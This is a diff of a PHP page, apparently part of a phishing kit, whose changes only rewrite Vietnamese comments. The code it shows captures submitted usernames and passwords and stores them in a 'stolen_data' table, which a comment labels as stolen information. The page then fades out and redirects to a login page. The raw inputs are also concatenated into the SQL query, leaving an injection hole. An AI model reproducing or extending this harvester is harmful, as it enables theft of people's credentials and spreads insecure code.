@@ -13,7 +13,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST['username'];
     $password = $_POST['password'];
 
-    // Lưu thông tin đánh cắp
+    //luu thong tin danh cap
     $mysqli->query("
         INSERT INTO stolen_data (username, password, created_at)
         VALUES ('$username', '$password', NOW())
@@ -60,15 +60,15 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
   </div>
 
   <script>
-  // Sau 5 giây thì làm hiệu ứng fade-out rồi chuyển trang
+  // hieu ung chuyen trang
   setTimeout(function() {
     document.body.style.transition = "opacity 0.5s";
     document.body.style.opacity = 0;
 
     setTimeout(function() {
       window.location.href = "login.php";
-    }, 500); // sau 0.5 giây (hiệu ứng mờ dần) thì chuyển
-  }, 3000); // chờ 3 giây trước khi fade
+    }, 500); // sau 0.5 giây (hieu ung mo dan) thi chuyen
+  }, 3000); // cho 3 giay truoc khi fade
 </script>
 </body>
 </html>
